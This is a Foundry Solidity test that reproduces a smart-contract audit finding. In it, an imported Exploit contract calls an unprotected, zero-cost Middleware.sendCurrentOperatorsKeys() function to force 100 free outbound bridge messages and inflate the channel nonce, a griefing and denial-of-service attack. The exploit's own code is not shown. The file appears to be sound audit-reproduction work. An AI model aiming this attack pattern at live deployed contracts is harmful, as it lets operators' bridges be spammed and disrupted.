// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, Middleware, Gateway, MiniToken} from "./63290-h-01-permissionless-sendcurrentoperatorskeys-pashov-audit-gr.sol";

// Tanssi H-01 (finding 63290): Middleware.sendCurrentOperatorsKeys() is external
// with no access control, and the outbound ticket is built with zero cost
// (ticket.costs = Costs(0,0)). So any unprivileged caller can, for free, force
// outbound bridge messages and inflate the channel's outbound nonce — griefing/DoS.
contract Finding63290Test is Test {
    address internal constant SINK = address(uint160(0xD00D));

    function test_exploit_permissionlessOutboundSpam_griefsBridge() public {
        Exploit e = new Exploit();

        // sanity: attacker (the Exploit contract) is NOT the middleware — unprivileged
        assertTrue(address(e) != address(e.vuln()), "driver must be an outside caller");

        e.run();

        emit log_named_uint("free outbound messages forced", e.messagesForced());
        emit log_named_uint("outbound nonce inflation", e.nonceInflation());
        emit log_named_uint("grief units at sink", e.griefUnitsToSink());

        // permissionless spam went through
        assertEq(e.messagesForced(), 100, "attacker forced 100 free outbound messages");
        // the finite bridge resource (channel outbound nonce) was inflated
        assertEq(e.nonceInflation(), 100, "channel outbound nonce inflated by spam");
        // griefing magnitude recorded at the sink
        assertEq(e.griefUnitsToSink(), 100 ether, "100 grief units minted to sink");
        assertEq(MiniToken(e.marker()).balanceOf(SINK), 100 ether, "sink holds grief units");
    }
}
